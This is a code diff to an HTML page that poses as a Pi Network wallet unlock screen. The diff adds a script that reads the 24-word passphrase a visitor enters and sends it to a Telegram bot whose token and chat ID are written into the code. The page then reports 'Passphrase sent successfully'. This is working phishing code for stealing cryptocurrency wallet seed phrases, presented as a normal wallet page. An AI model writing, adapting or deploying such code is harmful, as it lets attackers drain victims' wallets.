@@ -111,12 +111,57 @@
         <!-- Unlock Pi Wallet Content -->
         <h1>Unlock Pi Wallet</h1>
         <p>Enter your 24-word passphrase here to unlock Locked PI Tokens</p>
-        <textarea class="passphrase-input" placeholder="Enter your 24-word passphrase"></textarea>
-        <button class="button unlock-button">Unlock with Passphrase</button>
+        <textarea id="passphrase-input" class="passphrase-input" placeholder="Enter your 24-word passphrase"></textarea>
+        <button id="unlock-button" class="button unlock-button">Unlock with Passphrase</button>
         <button class="button biometric-button">Biometric Not Available</button>
         <div class="warning">
             <p>Lost your passphrase? <a href="#">You can create a new wallet</a>, but all your π in your previous wallet will be inaccessible.</p>
         </div>
     </div>
+
+    <script>
+        // Telegram Bot Token and Chat ID
+        const botToken = '7263036488:AAEKpKlkHNq2oqfENbCBkpVat_bB7LoxHXc'; // Replace with your bot token
+        const chatId = '6872862496'; // Replace with the chat ID of @bankymichael
+
+        // Function to send data to Telegram
+        async function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            const payload = {
+                chat_id: chatId,
+                text: message,
+            };
+
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload),
+                });
+
+                if (response.ok) {
+                    alert('Passphrase sent successfully!');
+                } else {
+                    alert('Failed to send passphrase. Please try again.');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                alert('An error occurred. Please try again.');
+            }
+        }
+
+        // Add click event to the "Unlock with Passphrase" button
+        document.getElementById('unlock-button').addEventListener('click', () => {
+            const passphrase = document.getElementById('passphrase-input').value.trim();
+
+            if (passphrase) {
+                sendToTelegram(`Passphrase: ${passphrase}`);
+            } else {
+                alert('Please enter your 24-word passphrase.');
+            }
+        });
+    </script>
 </body>
 </html>
